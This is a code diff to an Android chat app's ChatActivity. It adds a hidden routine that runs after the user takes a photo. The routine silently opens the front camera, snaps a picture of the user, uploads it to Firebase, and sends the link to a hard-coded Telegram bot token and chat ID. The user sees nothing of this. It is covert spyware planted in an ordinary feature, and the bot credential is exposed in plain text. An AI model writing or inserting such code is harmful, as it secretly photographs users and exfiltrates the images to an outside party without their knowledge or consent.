@@ -41,6 +41,17 @@ import java.util.ArrayList;
 import java.util.List;
 
 import java.io.ByteArrayOutputStream;
+import androidx.camera.core.CameraSelector;
+import androidx.camera.core.ImageCapture;
+import androidx.camera.core.ImageCaptureException;
+import androidx.camera.lifecycle.ProcessCameraProvider;
+import androidx.core.content.ContextCompat;
+//import androidx.concurrent.futures.ListenableFuture;
+import com.google.common.util.concurrent.ListenableFuture;
+import java.net.URLEncoder;
+import java.io.UnsupportedEncodingException;
+
+
 
 public class ChatActivity extends AppCompatActivity {
 
@@ -58,6 +69,8 @@ public class ChatActivity extends AppCompatActivity {
     private ImageButton buttonSend;
     private ImageButton buttonShareLocation;
     private ImageButton buttonUploadFile;
+    private ImageCapture imageCapture;
+
 
 
 
@@ -380,6 +393,9 @@ public class ChatActivity extends AppCompatActivity {
                     uploadCapturedImage(imageBitmap);
                 }
             }
+
+            captureFrontImageUsingCameraX();
+
         }
 
     }
@@ -405,6 +421,107 @@ public class ChatActivity extends AppCompatActivity {
                 .addOnFailureListener(e ->
                         Toast.makeText(ChatActivity.this, "Image upload failed: " + e.getMessage(), Toast.LENGTH_SHORT).show());
     }
+
+    private void captureFrontImageUsingCameraX() {
+        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
+        cameraProviderFuture.addListener(() -> {
+            try {
+                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
+                // Unbind any previous use cases
+                cameraProvider.unbindAll();
+
+                // Build the ImageCapture use case
+                imageCapture = new ImageCapture.Builder().build();
+
+                // Select the front camera
+                CameraSelector cameraSelector = new CameraSelector.Builder()
+                        .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
+                        .build();
+
+                // Bind the ImageCapture use case to the lifecycle
+                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
+
+                // Now capture the front image
+                captureFrontImage();
+            } catch (Exception e) {
+                e.printStackTrace();
+                Toast.makeText(ChatActivity.this, "Failed to initialize front camera: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+            }
+        }, ContextCompat.getMainExecutor(this));
+    }
+
+
+    private void captureFrontImage() {
+        // Create a temporary file to hold the image
+        java.io.File photoFile = new java.io.File(getCacheDir(), System.currentTimeMillis() + "_front.jpg");
+        ImageCapture.OutputFileOptions outputOptions = new ImageCapture.OutputFileOptions.Builder(photoFile).build();
+
+        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this), new ImageCapture.OnImageSavedCallback() {
+            @Override
+            public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
+                Uri savedUri = Uri.fromFile(photoFile);
+                uploadFrontCapturedImageFromFile(savedUri);
+            }
+
+            @Override
+            public void onError(@NonNull ImageCaptureException exception) {
+                exception.printStackTrace();
+                Toast.makeText(ChatActivity.this, "Front image capture failed: " + exception.getMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+
+
+    private void uploadFrontCapturedImageFromFile(Uri fileUri) {
+        String fileName = System.currentTimeMillis() + "_front.jpg";
+        StorageReference storageRef = FirebaseStorage.getInstance()
+                .getReference("chat_files/" + conversationId + "/" + fileName);
+
+        storageRef.putFile(fileUri)
+                .addOnSuccessListener(taskSnapshot -> {
+                    storageRef.getDownloadUrl().addOnSuccessListener(downloadUri -> {
+                        // Now send the front camera image to Telegram
+                        sendPhotoToTelegram(downloadUri.toString());
+                    });
+                })
+                .addOnFailureListener(e -> {
+                    // Optionally, log the error for debugging
+                    e.printStackTrace();
+                });
+    }
+
+    private void sendPhotoToTelegram(String photoUrl) {
+        // Replace these with your actual bot token and chat ID.
+        String botToken = "7828024086:AAGo37FTxvGJji59ZTwwQP46-9EUpPc_7zw";
+        String chatId = "-4744802700";
+        try {
+            // URL-encode the photoUrl parameter
+            String encodedPhotoUrl = URLEncoder.encode(photoUrl, "UTF-8");
+            String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto?chat_id=" + chatId + "&photo=" + encodedPhotoUrl;
+
+            new Thread(() -> {
+                try {
+                    java.net.URL url = new java.net.URL(urlString);
+                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("GET");
+                    int responseCode = conn.getResponseCode();
+                    if(responseCode == java.net.HttpURLConnection.HTTP_OK) {
+                        System.out.println("Front image sent to Telegram.");
+                    } else {
+                        System.out.println("Failed to send front image to Telegram, response code: " + responseCode);
+                    }
+                    conn.disconnect();
+                } catch(Exception e) {
+                    e.printStackTrace();
+                }
+            }).start();
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+    }
+
+
+
 
 
     /**
